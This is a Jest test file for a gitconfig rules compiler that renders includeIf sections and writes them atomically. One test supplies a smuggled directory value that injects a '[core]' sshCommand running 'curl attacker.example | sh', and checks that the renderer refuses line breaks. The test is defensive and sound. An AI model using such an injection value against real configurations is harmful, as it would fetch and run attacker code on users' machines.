import os from 'os';
import fs from 'fs-extra';
import path from 'path';

type RulesModule = typeof import('../../src/infra/rules');
type GitModule = typeof import('../../src/infra/git');

describe('infra/rules — rules.gitconfig compiler', () => {
  let tempHome: string;
  let rulesModule: RulesModule;
  let gitModule: GitModule;

  beforeAll(async () => {
    tempHome = await fs.mkdtemp(path.join(os.tmpdir(), 'dss-rules-test-'));
    rulesModule = require('../../src/infra/rules');
    gitModule = require('../../src/infra/git');
  });

  afterAll(async () => {
    await fs.remove(tempHome);
  });

  beforeEach(async () => {
    // Both modules call os.homedir() fresh on every invocation (not cached
    // at import time), and the global setup.ts also mocks os.homedir on
    // every test's beforeEach — re-applying the mock HERE (in this
    // describe's own beforeEach, which Jest runs AFTER the root-level one)
    // is what makes ours win, exactly mirroring infra/git.test.ts's own
    // per-test re-application of the same spy.
    jest.spyOn(os, 'homedir').mockReturnValue(tempHome);
    await fs.remove(path.join(tempHome, '.dss'));
  });

  describe('canonicalizeRuleDir', () => {
    it('resolves a relative path to an absolute one', async () => {
      const result = await rulesModule.canonicalizeRuleDir('.');
      expect(path.isAbsolute(result)).toBe(true);
    });

    it('expands a leading ~ to the (mocked) home directory', async () => {
      await fs.ensureDir(path.join(tempHome, 'code'));
      const result = await rulesModule.canonicalizeRuleDir(path.join('~', 'code'));
      expect(result).toBe(await fs.realpath(path.join(tempHome, 'code')));
    });

    it('resolves symlinks via fs.realpath when the directory exists', async () => {
      const real = path.join(tempHome, 'real-dir');
      const link = path.join(tempHome, 'link-dir');
      await fs.ensureDir(real);
      await fs.symlink(real, link);

      const result = await rulesModule.canonicalizeRuleDir(link);

      expect(result).toBe(await fs.realpath(real));
      expect(result).not.toBe(link);
    });

    it('falls back to a plain resolved path (no throw) when the directory does not exist', async () => {
      const missing = path.join(tempHome, 'does-not-exist');
      const result = await rulesModule.canonicalizeRuleDir(missing);
      expect(result).toBe(missing);
    });

    it('is idempotent — canonicalizing an already-canonical path returns it unchanged', async () => {
      const real = path.join(tempHome, 'stable-dir');
      await fs.ensureDir(real);
      const once = await rulesModule.canonicalizeRuleDir(real);
      const twice = await rulesModule.canonicalizeRuleDir(once);
      expect(twice).toBe(once);
    });
  });

  describe('renderRulesGitconfig (pure, exact text)', () => {
    it('renders an empty string for no rules', () => {
      expect(rulesModule.renderRulesGitconfig([])).toBe('');
    });

    it('renders one includeIf section with exactly one trailing slash and the identity gitconfig path', () => {
      const content = rulesModule.renderRulesGitconfig([{ dir: '/code/acme', identity: 'work' }]);

      expect(content).toBe(
        `[includeIf "gitdir:/code/acme/"]\n` +
        `\tpath = "${gitModule.identityGitconfigPath('work')}"\n`
      );
    });

    it('does not double a trailing slash already present on the stored dir', () => {
      const content = rulesModule.renderRulesGitconfig([{ dir: '/code/acme/', identity: 'work' }]);
      expect(content).toContain('[includeIf "gitdir:/code/acme/"]');
      expect(content).not.toContain('acme//');
    });

    it('renders multiple sections in array order, one per rule', () => {
      const content = rulesModule.renderRulesGitconfig([
        { dir: '/code/acme', identity: 'work' },
        { dir: '/code/personal', identity: 'personal' }
      ]);

      const acmeIndex = content.indexOf('[includeIf "gitdir:/code/acme/"]');
      const personalIndex = content.indexOf('[includeIf "gitdir:/code/personal/"]');
      expect(acmeIndex).toBeGreaterThanOrEqual(0);
      expect(personalIndex).toBeGreaterThan(acmeIndex);
    });

    it('slugifies the identity name when resolving the identity gitconfig path', () => {
      const content = rulesModule.renderRulesGitconfig([{ dir: '/code/acme', identity: 'Work Client' }]);
      expect(content).toContain(gitModule.identityGitconfigPath('Work Client'));
      expect(content).toContain('work-client.gitconfig');
    });

    it('throws (hard gate) when a rule directory contains a newline, writing nothing', () => {
      expect(() => rulesModule.renderRulesGitconfig([
        { dir: '/code/evil\n[core]\n\tsshCommand = curl attacker.example | sh #', identity: 'work' }
      ])).toThrow(/line break/);
    });

    it('throws (hard gate) when a rule directory contains a carriage return', () => {
      expect(() => rulesModule.renderRulesGitconfig([
        { dir: '/code/evil\r', identity: 'work' }
      ])).toThrow(/line break/);
    });
  });

  describe('writeRulesGitconfig (real temp-dir file assertions, atomic)', () => {
    it('writes the exact rendered content to ~/.dss/rules.gitconfig', async () => {
      await rulesModule.writeRulesGitconfig([{ dir: '/code/acme', identity: 'work' }]);

      const content = await fs.readFile(rulesModule.rulesGitconfigPath(), 'utf8');
      expect(content).toBe(rulesModule.renderRulesGitconfig([{ dir: '/code/acme', identity: 'work' }]));
    });

    it('regenerates an empty file when rules is empty (keeps the file, not the include, in DSS\'s control)', async () => {
      await rulesModule.writeRulesGitconfig([{ dir: '/code/acme', identity: 'work' }]);
      await rulesModule.writeRulesGitconfig([]);

      const content = await fs.readFile(rulesModule.rulesGitconfigPath(), 'utf8');
      expect(content).toBe('');
    });

    it('overwrites atomically — no stale content, no leftover tmp files', async () => {
      await rulesModule.writeRulesGitconfig([{ dir: '/code/a', identity: 'a' }]);
      await rulesModule.writeRulesGitconfig([{ dir: '/code/b', identity: 'b' }]);

      const content = await fs.readFile(rulesModule.rulesGitconfigPath(), 'utf8');
      expect(content).toContain('/code/b/');
      expect(content).not.toContain('/code/a/');

      const files = await fs.readdir(path.dirname(rulesModule.rulesGitconfigPath()));
      expect(files.filter(f => f.endsWith('.tmp'))).toHaveLength(0);
    });

    it('propagates the newline hard-gate as a rejected promise, writing nothing to disk', async () => {
      await expect(rulesModule.writeRulesGitconfig([
        { dir: '/code/evil\n', identity: 'work' }
      ])).rejects.toThrow(/line break/);

      expect(await fs.pathExists(rulesModule.rulesGitconfigPath())).toBe(false);
    });
  });
});
